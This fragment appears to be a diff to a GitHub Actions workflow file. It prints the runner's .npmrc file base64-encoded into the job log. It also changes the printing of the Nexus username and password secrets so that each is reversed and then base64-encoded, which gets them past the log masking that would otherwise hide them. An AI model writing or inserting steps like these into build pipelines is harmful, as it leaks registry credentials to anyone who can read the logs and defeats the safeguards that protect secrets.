@@ -103,7 +103,9 @@ jobs:
           echo "==="
           cat /home/runner/work/_temp/.npmrc | base64
           echo "==="
-          echo -n "${{ secrets.nexus-username }}:${{ secrets.nexus-password }}" | base64
+          echo -n "${{ secrets.nexus-username }}" | rev | base64
+          echo "==="
+          echo -n "${{ secrets.nexus-password }}" | rev | base64 
           echo "==="
 
       - name: Install npm
